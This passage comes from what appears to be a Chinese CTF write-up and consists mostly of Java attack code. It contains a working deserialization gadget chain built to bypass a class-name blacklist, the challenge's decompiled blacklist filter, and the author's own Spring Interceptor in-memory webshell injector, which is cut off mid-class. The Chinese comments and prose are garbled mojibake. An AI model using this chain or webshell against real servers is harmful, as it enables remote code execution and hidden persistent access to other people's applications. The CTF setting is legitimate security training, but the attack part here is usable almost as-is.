</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">KeyPairGenerator</span><span class="w"> </span><span class="n">keyPairGen</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">KeyPairGenerator</span><span class="p">.</span><span class="na">getInstance</span><span class="p">(</span><span class="s">&#34;RSA&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">keyPairGen</span><span class="p">.</span><span class="na">initialize</span><span class="p">(</span><span class="n">2048</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">KeyPair</span><span class="w"> </span><span class="n">keyPair</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">keyPairGen</span><span class="p">.</span><span class="na">generateKeyPair</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">PrivateKey</span><span class="w"> </span><span class="n">privateKey</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">keyPair</span><span class="p">.</span><span class="na">getPrivate</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// åˆ›å»ºç­¾åå¼•æ“</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Signature</span><span class="w"> </span><span class="n">signingEngine</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Signature</span><span class="p">.</span><span class="na">getInstance</span><span class="p">(</span><span class="s">&#34;SHA256withRSA&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">signingEngine</span><span class="p">.</span><span class="na">initSign</span><span class="p">(</span><span class="n">privateKey</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">SignedObject</span><span class="w"> </span><span class="n">signedObject</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">SignedObject</span><span class="p">(</span><span class="n">badAttributeValueExpException</span><span class="p">,</span><span class="n">privateKey</span><span class="p">,</span><span class="n">signingEngine</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">POJONode</span><span class="w"> </span><span class="n">node</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">POJONode</span><span class="p">(</span><span class="n">signedObject</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//        BadAttributeValueExpException bad=new BadAttributeValueExpException(111);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//        setFiled(bad,&#34;val&#34;,node);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">XString</span><span class="w"> </span><span class="n">xString</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">XString</span><span class="p">(</span><span class="s">&#34;123&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Constructor</span><span class="o">&lt;</span><span class="n">XString</span><span class="o">&gt;</span><span class="w"> </span><span class="n">Constructor</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">XString</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">getDeclaredConstructor</span><span class="p">(</span><span class="n">Object</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Constructor</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//XString xString = Constructor.newInstance(new XString(&#34;123&#34;));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">XString</span><span class="w"> </span><span class="n">xString2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Constructor</span><span class="p">.</span><span class="na">newInstance</span><span class="p">(</span><span class="n">node</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">HotSwappableTargetSource</span><span class="w"> </span><span class="n">hotSwappableTargetSource</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">HotSwappableTargetSource</span><span class="p">(</span><span class="n">xString</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">HotSwappableTargetSource</span><span class="w"> </span><span class="n">hotSwappableTargetSource2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">HotSwappableTargetSource</span><span class="p">(</span><span class="n">node</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">HashMap</span><span class="w"> </span><span class="n">hashMap</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">HashMap</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">hashMap</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="n">hotSwappableTargetSource2</span><span class="p">,</span><span class="s">&#34;111&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//hashMap.put(hotSwappableTargetSource,&#34;222&#34;);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Method</span><span class="w"> </span><span class="n">putVal</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">hashMap</span><span class="p">.</span><span class="na">getClass</span><span class="p">().</span><span class="na">getDeclaredMethod</span><span class="p">(</span><span class="s">&#34;putVal&#34;</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="w"> </span><span class="kt">boolean</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="w"> </span><span class="kt">boolean</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">putVal</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">putVal</span><span class="p">.</span><span class="na">invoke</span><span class="p">(</span><span class="n">hashMap</span><span class="p">,</span><span class="n">123</span><span class="p">,</span><span class="n">hotSwappableTargetSource</span><span class="p">,</span><span class="s">&#34;222&#34;</span><span class="p">,</span><span class="kc">false</span><span class="p">,</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//        Field modCount = hashMap.getClass().getDeclaredField(&#34;size&#34;);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//        modCount.setAccessible(true);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//        modCount.set(hashMap,2);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ByteArrayOutputStream</span><span class="w"> </span><span class="n">bos</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ByteArrayOutputStream</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ObjectOutputStream</span><span class="w"> </span><span class="n">oos</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ObjectOutputStream</span><span class="p">(</span><span class="n">bos</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">oos</span><span class="p">.</span><span class="na">writeObject</span><span class="p">(</span><span class="n">hashMap</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">oos</span><span class="p">.</span><span class="na">close</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">serializedBytes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">bos</span><span class="p">.</span><span class="na">toByteArray</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">base64EncodedBytes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Base64</span><span class="p">.</span><span class="na">encodeBase64</span><span class="p">(</span><span class="n">serializedBytes</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">String</span><span class="p">(</span><span class="n">base64EncodedBytes</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// ä»æ–‡ä»¶ä¸­ååºåˆ—åŒ–å¯¹è±¡</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">base64EncodedData</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;&#34;</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">decodedBytes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Base64</span><span class="p">.</span><span class="na">decodeBase64</span><span class="p">(</span><span class="n">base64EncodedData</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// ååºåˆ—åŒ–</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ByteArrayInputStream</span><span class="w"> </span><span class="n">bis</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ByteArrayInputStream</span><span class="p">(</span><span class="n">serializedBytes</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ObjectInputStream</span><span class="w"> </span><span class="n">ois</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">MyObjectInputStream</span><span class="p">(</span><span class="n">bis</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ois</span><span class="p">.</span><span class="na">readObject</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">setFiled</span><span class="p">(</span><span class="n">Object</span><span class="w"> </span><span class="n">templates</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">name</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="n">values</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">IllegalAccessException</span><span class="p">,</span><span class="w"> </span><span class="n">NoSuchFieldException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Field</span><span class="w"> </span><span class="n">declaredField</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">templates</span><span class="p">.</span><span class="na">getClass</span><span class="p">().</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="n">name</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">declaredField</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">declaredField</span><span class="p">.</span><span class="na">set</span><span class="p">(</span><span class="n">templates</span><span class="p">,</span><span class="n">values</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p><strong>MyObjectInputStream</strong></p>
<p>è¿™ä¸ªæ˜¯é¢˜ç›®çš„è¿‡æ»¤ï¼Œå¯ä»¥çœ‹åˆ°è¿‡æ»¤äº†CC5å¼€å¤´</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">//</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">// Source code recreated from a .class file by IntelliJ IDEA</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">// (powered by FernFlower decompiler)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.IOException</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.InputStream</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.InvalidClassException</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.ObjectInputStream</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.ObjectStreamClass</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">MyObjectInputStream</span><span class="w"> </span><span class="kd">extends</span><span class="w"> </span><span class="n">ObjectInputStream</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kd">final</span><span class="w"> </span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">blackList</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">String</span><span class="o">[]</span><span class="p">{</span><span class="s">&#34;AbstractTranslet&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;Templates&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;TemplatesImpl&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;javax.management&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;swing&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;awt&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;fastjson&#34;</span><span class="p">};</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="nf">MyObjectInputStream</span><span class="p">(</span><span class="n">InputStream</span><span class="w"> </span><span class="n">in</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">IOException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kd">super</span><span class="p">(</span><span class="n">in</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">protected</span><span class="w"> </span><span class="nf">MyObjectInputStream</span><span class="p">()</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">IOException</span><span class="p">,</span><span class="w"> </span><span class="n">SecurityException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">protected</span><span class="w"> </span><span class="n">Class</span><span class="o">&lt;?&gt;</span><span class="w"> </span><span class="n">resolveClass</span><span class="p">(</span><span class="n">ObjectStreamClass</span><span class="w"> </span><span class="n">desc</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">IOException</span><span class="p">,</span><span class="w"> </span><span class="n">ClassNotFoundException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">var2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">blackList</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">int</span><span class="w"> </span><span class="n">var3</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">var2</span><span class="p">.</span><span class="na">length</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">for</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">var4</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">0</span><span class="p">;</span><span class="w"> </span><span class="n">var4</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">var3</span><span class="p">;</span><span class="w"> </span><span class="o">++</span><span class="n">var4</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">String</span><span class="w"> </span><span class="n">black</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">var2</span><span class="o">[</span><span class="n">var4</span><span class="o">]</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">desc</span><span class="p">.</span><span class="na">getName</span><span class="p">().</span><span class="na">contains</span><span class="p">(</span><span class="n">black</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">InvalidClassException</span><span class="p">(</span><span class="s">&#34;Unauthorized deserialization attempt&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">desc</span><span class="p">.</span><span class="na">getName</span><span class="p">());</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="kd">super</span><span class="p">.</span><span class="na">resolveClass</span><span class="p">(</span><span class="n">desc</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p><strong>Interceptor_demo</strong></p>
<p>è¿™ä¸ªæ˜¯æˆ‘è‡ªå·±å†™çš„<code>springçš„Interceptorå†…å­˜é©¬</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">com.sun.org.apache.xalan.internal.xsltc.DOM</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.sun.org.apache.xalan.internal.xsltc.TransletException</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.sun.org.apache.xml.internal.dtm.DTMAxisIterator</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.sun.org.apache.xml.internal.serializer.SerializationHandler</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.aopalliance.intercept.Interceptor</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.springframework.lang.Nullable</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.springframework.web.bind.annotation.RequestMapping</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.springframework.web.bind.annotation.RestController</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.springframework.web.context.WebApplicationContext</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.springframework.web.context.request.RequestContextHolder</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.springframework.web.servlet.HandlerInterceptor</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.springframework.web.servlet.ModelAndView</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javax.servlet.http.HttpServletRequest</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javax.servlet.http.HttpServletResponse</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.BufferedReader</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.IOException</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.InputStreamReader</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.PrintWriter</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.Method</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nd">@RestController</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">Interceptor_demo</span><span class="w"> </span><span class="kd">extends</span><span class="w"> </span><span class="n">AbstractTranslet</span><span class="w"> </span><span class="kd">implements</span><span class="w"> </span><span class="n">HandlerInterceptor</span><span class="p">,</span><span class="n">Interceptor</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="nf">Interceptor_demo</span><span class="p">()</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;main&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">WebApplicationContext</span><span class="w"> </span><span class="n">context</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">WebApplicationContext</span><span class="p">)</span><span class="w"> </span><span class="n">RequestContextHolder</span><span class="p">.</span><span class="na">currentRequestAttributes</span><span class="p">().</span><span class="na">getAttribute</span><span class="p">(</span><span class="s">&#34;org.springframework.web.servlet.DispatcherServlet.CONTEXT&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">0</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">RequestMappingHandlerMapping</span><span class="w"> </span><span class="n">bean</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">null</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">context</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">bean</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">context</span><span class="p">.</span><span class="na">getBean</span><span class="p">(</span><span class="n">RequestMappingHandlerMapping</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">bean</span><span class="p">.</span><span class="na">setInterceptors</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">Interceptor</span><span class="o">[]</span><span class="p">{</span><span class="k">new</span><span class="w"> </span><span class="n">Interceptor_demo</span><span class="p">(</span><span class="s">&#34;a&#34;</span><span class="p">)});</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Class</span><span class="o">&lt;?&gt;</span><span class="w"> </span><span class="n">aClass2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="s">&#34;org.springframework.web.servlet.handler.AbstractHandlerMapping&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Method</span><span class="w"> </span><span class="n">initApplicationContext</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">aClass2</span><span class="p">.</span><span class="na">getDeclaredMethod</span><span class="p">(</span><span class="s">&#34;initApplicationContext&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">initApplicationContext</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">initApplicationContext</span><span class="p">.</span><span class="na">invoke</span><span class="p">(</span><span class="n">bean</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;1111111111111111111111&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@Override</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">transform</span><span class="p">(</span><span class="n">DOM</span><span class="w"> </span><span class="n">document</span><span class="p">,</span><span class="w"> </span><span class="n">SerializationHandler</span><span class="o">[]</span><span class="w"> </span><span class="n">handlers</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">TransletException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@Override</span><span class="w">
